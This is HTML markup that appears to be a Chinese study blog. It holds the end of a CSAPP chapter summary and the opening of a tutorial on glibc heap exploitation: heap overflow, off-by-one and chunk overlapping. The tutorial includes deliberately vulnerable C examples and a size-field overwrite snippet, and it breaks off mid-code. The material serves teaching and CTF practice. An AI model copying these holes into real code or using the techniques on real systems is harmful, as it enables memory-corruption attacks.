文件中。</p><p>此时的文件用文本编辑器打开的话内容将是乱码。</p><h3 id="04-链接"><a href="#04-链接" class="headerlink" title="04 链接"></a>04 链接</h3><p>链接器 .o 目标文件与其他目标文件、库文件、启动文件等链接起来<strong>生成可执行目标文件</strong>。</p><p>例如我们在程序中调用 printf 函数，printf 函数存在于一个名为 printf.o 的单独的预编译好了的目标文件中，而这个文件必须由链接器合并到我们的 hello.o 程序中。</p><h1 id="系统的硬件组成"><a href="#系统的硬件组成" class="headerlink" title="系统的硬件组成"></a>系统的硬件组成</h1><p>系统硬件由四部分组成：总线、I&#x2F;O设备、主存和处理器</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E7%A1%AC%E4%BB%B6%E7%BB%84%E6%88%90.png"></p><h3 id="总线"><a href="#总线" class="headerlink" title="总线"></a>总线</h3><p>总线就是贯穿整个系统的电子管道，负责在各个部件之间传递信息。</p><p>通常总线被设计成传送定长的字节块，也就是计算机处理数据的基本单元大小<strong>字（word）</strong>。不同系统中的机器字长不同，大部分是 4 字节（32位）和 8 字节（64位）。</p><h3 id="I-x2F-O-设备"><a href="#I-x2F-O-设备" class="headerlink" title="I&#x2F;O 设备"></a>I&#x2F;O 设备</h3><p>I&#x2F;O（输入&#x2F;输出）设备就是系统与外界联系的通道。像键盘鼠标，以及磁盘驱动器、网络驱动器之类的硬件都是 I&#x2F;O 设备。</p><p>每个 I&#x2F;O 设备都通过一个<strong>控制器</strong>或<strong>适配器</strong>与 I&#x2F;O 总线相连，负责在二者之间传递信息。</p><blockquote><p>控制器是 I&#x2F;O 设备本身或者系统的主印制电路板（主板）上的芯片组</p><p>适配器是一块插在主板插槽上的卡</p></blockquote><h3 id="主存"><a href="#主存" class="headerlink" title="主存"></a>主存</h3><p>从物理上来说，主存是由一组<strong>动态随机存取存储器</strong>（DRAM）芯片组成的。从逻辑上来说，存储器是一个线性的字节数组，每个字节都有其唯一的地址（数组索引），这些地址是从零开始的。</p><blockquote><p>主存也就是我们会在购买电脑时在详情页中看到的“运行内存”，代表程序可以同时运行的程序和数据大小</p></blockquote><h3 id="处理器"><a href="#处理器" class="headerlink" title="处理器"></a>处理器</h3><p><strong>中央处理单元</strong>（CPU），简称<strong>处理器</strong>，是解释（或执行）存储在主存中指令的引擎。处理器的核心是一个大小为一个字的存储设备（或<strong>寄存器</strong>），称为<strong>程序计数器</strong>（PC）。</p><p>在任何时刻，PC 都指向主存中的某条机器语言指令（即含有该条指令的地址）。</p><blockquote><p>此 PC 非 “个人计算机” PC 哦</p></blockquote><p>从系统通电开始，直到系统断电，处理器一直在不断地执行程序计数器指向的指令，再更新程序计数器，使其指向下一条指令，不断循环往复。这个过程围绕着主存、<strong>寄存器文件</strong>（register file）和<strong>算术&#x2F;逻辑单元</strong>（ALU）进行。</p><h3 id="运行一个程序"><a href="#运行一个程序" class="headerlink" title="运行一个程序"></a>运行一个程序</h3><p>假设我们目标运行的程序将输出 “hello world！”，我们在命令行解释器shell中直接输入文件名，系统就会执行文件并作出相应的输出。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">linux&gt; </span><span class="language-bash">./hello</span><br>hello world！<br></code></pre></td></tr></table></figure><p>在计算机层面，运行程序就是不断复制的一个过程，大致分为以下几个流程：</p><p>首先我们在键盘上输入字符串 <code>”./hello“</code> ，shell 会将其字符逐一读入寄存器，再把他们放入内存中。</p><p>![](&#x2F;img&#x2F;CSAPP-第一章-计算机系统漫游-总结&#x2F;1-read hello from keyboard.png)</p><p>敲击回车键以后，shell 就会执行一系列指令来加载可执行的 hello 文件，这些指令将会把目标文件中的代码和数据复制到主存。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E4%BB%8E%E7%A3%81%E7%9B%98%E5%8A%A0%E8%BD%BD%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E5%88%B0%E4%B8%BB%E5%AD%98.png"></p><p>接下来，CPU就会开始处理 目标程序的 main 程序中的机器语言指令。这些指令将会把将要输出的字符串中的字节从主存复制到寄存器文件，再从寄存器复制到显示设备，最终显示到屏幕上。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E5%B0%86%E8%BE%93%E5%87%BA%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BB%8E%E5%AD%98%E5%82%A8%E5%99%A8%E5%86%99%E5%88%B0%E6%98%BE%E7%A4%BA%E5%99%A8.png"></p><h1 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h1><p>我们可以把操作系统理解为应用程序和硬件之间的一层软件，所有应用对硬件的操作尝试都必须经过操作系统。</p><p>![](&#x2F;img&#x2F;CSAPP-第一章-计算机系统漫游-总结&#x2F;1-操作系统 .png)</p><p>操作系统的功能：</p><ul><li><p>防止硬件被失控的应用程序滥用</p></li><li><p>向应用程序提供简单一致的机制来控制低级硬件设备</p></li></ul><p>操作系统通过三个抽象概念来实现上述功能：进程、虚拟内存、文件</p><p>三个概念的关系如下图所示：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E7%A1%AC%E4%BB%B6%E7%9A%84%E6%8A%BD%E8%B1%A1%E5%85%B3%E7%B3%BB.png"></p><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p><strong>进程</strong>是操作系统对正在运行的程序的一种抽象。</p><p><strong>线程</strong>是操作系统能够进行运算调度的最小单位。它被包含在进程之中，是进程中的实际运作单位。一个进程由多个线程组成，每个线程都运行在进程的上下文中，共享同样的代码和数据。</p><p><strong>并发运行</strong>是指一个进程的指令和另一个进程的指令交错执行，多个进程同时活动。一个CPU通过上下文切换实现并发执行多个程序。</p><h3 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h3><p><strong>虚拟内存</strong>是主存和I&#x2F;O设备的抽象，它为进程提供一种独立占用内存的假象。</p><p>每个进程看到的内存都是一致的，称为<strong>虚拟地址空间</strong>。每个进程看到的虚拟地址空间由大量准确定义的区构成，每个区都有专门的功能。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E8%BF%9B%E7%A8%8B%E7%9A%84%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4.png"></p><h4 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h4><p>文件就是<strong>字节序列</strong>，每个I&#x2F;O设备，包括磁盘、键盘、显示设备，甚至网络都可看为文件。</p><h1 id="重要概念"><a href="#重要概念" class="headerlink" title="重要概念"></a>重要概念</h1><h3 id="Amdahl-定律"><a href="#Amdahl-定律" class="headerlink" title="Amdahl 定律"></a>Amdahl 定律</h3><p>Amdahl 定律（也叫阿姆达尔定律）主要思想是，当我们对系统的某个部分加速时，其对系统整体性能的影响取决于该部分的重要性和加速程度。</p><p>所以，<strong>要想显著加速整个系统，必须提升全系统中相当大的部分的速度</strong>。</p><h3 id="并行和并发"><a href="#并行和并发" class="headerlink" title="并行和并发"></a>并行和并发</h3><p><strong>并发</strong>是指一个同时具有多个活动的系统。</p><p><strong>并行</strong>是指用并发来使一个系统运行得更快。</p><h4 id="线程级并发"><a href="#线程级并发" class="headerlink" title="线程级并发"></a>线程级并发</h4><p>构建在进程这个抽象之上，我们能够设计出同时有多个程序执行的系统，这就导致了并发。使用线程，我们甚至能够在一个进程中执行多个控制流。</p><p><strong>多处理器系统</strong>是由单操作系统内核控制的多处理器组成的系统。</p><p><strong>多核处理器</strong>是将多个CPU(称为”核”)集成到一个集成电路芯片上。</p><p>超线程，有时称为<strong>同时多线程</strong>（simultaneous multi-threading），是一项允许一个 CPU 执行多个控制流的技术。超线程的处理器可以在单个周期的基础上决定要执行哪一个线程，比如，假设一个线程必须等到某些数据被装载到高速缓存中，那在这个装在过程中， CPU 就可以继续去执行另外的一个线程。</p><h4 id="指令级并行"><a href="#指令级并行" class="headerlink" title="指令级并行"></a>指令级并行</h4><p>现代处理器可以同时执行多条指令的属性称为指令级并行。</p><p><strong>超标量处理器</strong>是指可以达到比一个周期一条指令更快的执行速率的处理器。</p><h4 id="单指令、多数据并行"><a href="#单指令、多数据并行" class="headerlink" title="单指令、多数据并行"></a>单指令、多数据并行</h4><p>单指令、多数据，即 SIMD 并行，就是许多现代处理器拥有特殊的硬件，允许一条指令产生多个可以并行执行的操作。</p><h3 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h3><p>虚拟机提供对整个计算机的抽象，包括操作系统、处理器和程序。</p><p>虚拟机这个抽象概念与之前的进程、虚拟内存和文件的抽象概念关系如下图：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%8F%90%E4%BE%9B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%BD%E8%B1%A1.png"></p><hr><p>之前一直在<del>快乐暑假摆烂</del> 到处吃席，终于要开始恢复学习状态辣🤪</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>堆漏洞利用(一)</title>
    <link href="/2023/08/06/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/"/>
    <url>/2023/08/06/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<p>堆漏洞的利用姿势，赶紧来学习一下吧！！</p><span id="more"></span><p><del>这个人发什么疯</del></p><blockquote><p>如果没有特殊说明，环境为 ubuntu16  libc2.23  64位</p><p>这个网址可以查看源码 ：<a href="https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c">malloc.c - malloc&#x2F;malloc.c - Glibc source code (glibc-2.23) - Bootlin</a></p></blockquote><h1 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h1><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>堆溢出是指程序向某个堆块写入的字节数超过了堆块本身<strong>可以使用的字节数</strong>，因而导致了数据溢出，并覆盖到了物理相邻的高地址的下一个堆块。</p><p>堆溢出的前提是：</p><ul><li>程序向堆上写入数据</li><li>写入的数据大小没有被良好的控制</li></ul><p>堆溢出和栈溢出、BSS段溢出相似，是一种缓冲区溢出。但是与栈溢出不同的是，对上并没有返回地址这样的可以让攻击者直接控制执行流程的数据，因此在堆溢出的利用中，我们无法通过控制EIP来控制程序。</p><p>但我们可以利用与堆相关的数据结构哇，我们的利用策略如下：</p><ul><li><p>覆盖与其<strong>物理相邻的下一个 chunk</strong> 的内容</p><ul><li><p>prev_size</p></li><li><p>size，低三位的比特位数据，以及堆块真正的大小</p><ul><li><p>NON_MAIN_ARENA</p></li><li><p>IS_MAPPED</p></li><li><p>PREV_INUSE</p></li><li><p>the true chunk size</p></li></ul></li><li><p>chunk content，改变程序的执行流</p></li></ul></li><li><p>利用堆的机制实现任意地址写入或者控制堆块中的内容，从而执行程序的控制流。</p></li></ul><h3 id="举个栗子："><a href="#举个栗子：" class="headerlink" title="举个栗子："></a>举个栗子：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> <br>&#123;<br>  <span class="hljs-type">char</span> *chunk;<br>  chunk=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">24</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Get input:&quot;</span>);<br>  gets(chunk);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们输入A*100，就可以把相邻的堆覆盖掉</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/heapout_first.png"></p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/heapout_last.png"></p><h3 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h3><h5 id="寻找分配函数"><a href="#寻找分配函数" class="headerlink" title="寻找分配函数"></a>寻找分配函数</h5><p>通常来说，堆通过 malloc 函数分配，在某些情况下也会通过 calloc 函数分配。这两个函数的区别就是 calloc 在分配后会将空间全部初始化为0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x20</span>);<br><span class="hljs-comment">//等同于</span><br>ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><span class="hljs-built_in">memset</span>(ptr,<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>);<br></code></pre></td></tr></table></figure><p>除此之外，还有一个 realloc 分配方式，用于将目标内存扩大。realloc 函数可以身兼 malloc 和 free 两个函数的功能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">reaclloc(prt,size)        <span class="hljs-comment">//将ptr内存大小增大到size。</span><br></code></pre></td></tr></table></figure><p>具体操作：</p><ul><li><p>如果 realloc 的 size 不等于 prt 的 size ：</p><ul><li>申请 size &gt; 原来的 size<ul><li>如果 chunk 与 top chunk 相邻，直接拓展这个 chunk 到新的 size 大小</li><li>如果 chunk 与 top chunk 不相邻，相当于 <code>free(ptr); malloc(new_size)</code></li></ul></li><li>申请 size &lt; 原来的 size<ul><li>如果相差不足以容纳一个最小的 chunk，（64 位下 32 个字节，32 位下 16 个字节），则保持不变</li><li>如果相差足够容纳下一个最小的 chunk，就切割原本的 chunk，free 掉后半部分</li></ul></li></ul></li><li><p>如果 realloc 的 size 等于 0，相当于 <code>free(prt)</code></p></li><li><p>如果 realloc 的 size 等于 prt 的 size，那计算机将不进行任何操作</p></li></ul><h5 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h5><p>其实就是栈溢出的时候我们利用的那一批危险函数。常见的危险函数如下</p><ul><li>输入<ul><li>gets，直接读取一行，忽略 <code>&#39;\x00&#39;</code></li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy，字符串复制，遇到 <code>&#39;\x00&#39;</code> 停止</li><li>strcat，字符串拼接，遇到 <code>&#39;\x00&#39;</code> 停止</li><li>bcopy</li></ul></li></ul><h5 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h5><p>计算我们开始写入的地址与我们所要覆盖的地址之间的距离。需要注意的是，malloc参数并不等于实际堆块分配的大小，我们之前提到，在实际的内存分配中需要保证chunk 大小是对齐的（字长的两倍）。</p><p>并且也并不是机器分配的chunk都是用户可以使用的用户区域，<code>chunk_head.size = 用户区域大小 + 2 * 字长</code></p><p>就比如我们使用 <code>malloc(24)</code> ，在 64 位的系统中申请 24 字节的 chunk 。但由于需要保证内存对齐，系统会向上取整到 32 字节。在分配出来的32字节中，又有两个机器字长也就是 16 字节的头部不能供用户使用，所以实际上我们申请 24 字节的字段，实际上用户可以使用的 chunk 为 16 字节。</p><p>但是这个堆块仍然可以储存24字节的数据，因为它可以使用下一个 chunk 的 pre_size 字段，正好 24 个字节（ off-by-one 漏洞就是这么来的）。</p><h1 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h1><p>严格来讲 off-by-one 也是一种溢出的操作，但是 off-by-one 特指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只<strong>越界了一个字节</strong>的溢出利用。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>off-by-one 是单字节溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况（就像上一个 malloc(24) 的例子）。</p><p>其中边界验证不严谨主要有以下几种可能：</p><ul><li>使用循环语句向堆中写入数据时，循环次数设置错误</li><li>字符串操作不正确</li></ul><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><h5 id="溢出字节为可控制字节"><a href="#溢出字节为可控制字节" class="headerlink" title="溢出字节为可控制字节"></a>溢出字节为可控制字节</h5><p>通过修改内存块的大小造成块结构之间的重叠，从而泄露其他块数据，或是覆盖修改其他块数据。</p><h5 id="溢出字节为NULL字节"><a href="#溢出字节为NULL字节" class="headerlink" title="溢出字节为NULL字节"></a>溢出字节为NULL字节</h5><p>在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。</p><ul><li>使用 unlink 进行处理</li><li>这时 <code>prev_size</code> 域就会启用，可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的大小与<code>prev_size</code> 是否一致。</li></ul><blockquote><p>在glibc2.28及以前的版本中都是可以使用的，最新版本中已经添加了对应的检查方法。</p></blockquote><h4 id="🌰："><a href="#🌰：" class="headerlink" title="🌰："></a>🌰：</h4><p>栗子1：</p><p>导致 off-by-one 漏洞的一个原因就是输入的边界检查不清，以下是一个栅栏错误：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">my_gets</span><span class="hljs-params">(<span class="hljs-type">char</span> *ptr,<span class="hljs-type">int</span> size)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;=size;i++)<br>    &#123;<br>        ptr[i]=getchar();<br>    &#125;<br>    <span class="hljs-keyword">return</span> i;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> *chunk1,*chunk2;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">16</span>);<br>    chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">16</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Get Input:&quot;</span>);<br>    my_gets(chunk1,<span class="hljs-number">16</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>如上，我们自己写的 my_gets 函数实际输入 size+1 位数据，造成了 off-by-one 溢出。</p><p>我们使用 gdb 对程序进行调试，查看在进行输入分配的堆块为两个十六字节的堆块：</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/chunk_heap.png"></p><p>连续输入17个1，会发现覆盖到了下一个 chunk 的 <em>prev_size</em> 字节。</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/chunk_heapflow.png"></p><p>栗子2：</p><p>导致 off-by-one 的场景就是字符串操作了，常见的原因是字符串的结束符计算有误</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">40</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-type">void</span> *chunk1;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">24</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Get Input&quot;</span>);<br>    gets(buffer);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(buffer)==<span class="hljs-number">24</span>)<br>    &#123;<br>        <span class="hljs-built_in">strcpy</span>(chunk1,buffer);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>           <br>&#125;<br></code></pre></td></tr></table></figure><p>这个程序乍一看没有任何问题，但是我们需要注意到的是，strlen 的长度计算方法和 strcpy 复制时的长度是不一样的。strlen 计算ASCII 字符串的长度，它在计算长度时是不会把字符串结尾的 ‘\x00’ 计算在内的，但是 strcpy 在复制字符串的时候会拷贝字符串的结束符 ‘\x00’ 。这就导致我们实际上是向chunk1 中写入了25字节。</p><p>在strcpy命令执行之前我们的堆结构如下：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x804b158</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x804b168</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x804b178</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000411</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>执行后就会发现它覆盖了下一个堆块的低字节（小端序）：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x804b158</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><span class="hljs-number">0</span>x4<span class="hljs-number">141414141414141</span><br><span class="hljs-number">0x804b168</span>:<span class="hljs-number">0</span>x4<span class="hljs-number">141414141414141</span><span class="hljs-number">0</span>x4<span class="hljs-number">141414141414141</span><br><span class="hljs-number">0x804b178</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000400</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>（为什么没有截图，因为这玩意我都复现不成功😅）</p><blockquote><p>这个漏洞在2.29之后就不能利用了，因为glibc更新以后增加了检查的代码。</p></blockquote><h1 id="Chunk-Extend-and-Overlapping"><a href="#Chunk-Extend-and-Overlapping" class="headerlink" title="Chunk Extend and Overlapping"></a>Chunk Extend and Overlapping</h1><p>这种攻击目的在于将一个chunk块的可控区域衍生到与其相邻的一个或者多个chunk块中。通过这种攻击方式，我们可以修改到不属于本chunk块的内容。通过 extend 可以实现 chunk overlapping 的效果。</p><p>一般来说这种技术并不能直接控制程序的执行流程，但是可以控制chunk 中的内容。如果chunk 中存在字符串指针、函数指针等，就可以利用这些指针来进一步进行信息泄露和程序执行流程。</p><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>chunk extend 技术能够产生的原因在于 ptmalloc 在对堆 chunk 进行操作时使用的各种宏。</p><ul><li><p>获取当前 chunk 块大小的操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 仅用户空间部分的大小 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span><br><span class="hljs-comment">//SIZE_BITS 在这里是一个代表堆块大小的标志位掩码</span><br><br><span class="hljs-comment">/* 完整堆块的大小 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span><br></code></pre></td></tr></table></figure></li><li><p>获取下一个 chunk 块地址的操作，即使用当前块指针加上当前块大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span><br></code></pre></td></tr></table></figure></li><li><p>获取前一个 chunk 块信息的操作，其中堆块地址的计算是由当前 chunk 地址减去前一个 chunk 的大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 前一个堆块的大小 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span><br><br><span class="hljs-comment">/* 前一个堆块的地址  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span><br></code></pre></td></tr></table></figure></li><li><p>判断当前堆块是否被使用，即查看下一 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> inuse(p)</span><br>    ((((mchunkptr)(((<span class="hljs-type">char</span> *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)<br></code></pre></td></tr></table></figure></li></ul><p>通过上面的几个宏我们可以看出， ptmalloc 通过 chunk header 的数据来判断 chunk 的使用情况和对 chunk 前后进行定位。</p><p>而我们的 chunk extend 就是通过控制 chunk header 即 size 和 pre_size 域来实现跨越块操作导致 overlapping。</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><h5 id="🌰1：对-inuse-的-fastbin-进行-extend"><a href="#🌰1：对-inuse-的-fastbin-进行-extend" class="headerlink" title="🌰1：对 inuse 的 fastbin 进行 extend"></a>🌰1：对 inuse 的 fastbin 进行 extend</h5><p>就是通过更改第一个堆块的信息来控制它之后的堆块的内容</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3;<br>    ptr1 = malooc(<span class="hljs-number">0x10</span>);<br>    ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr1<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x41</span>;  <span class="hljs-comment">// 修改第一个块的size域</span><br>    <br>    <span 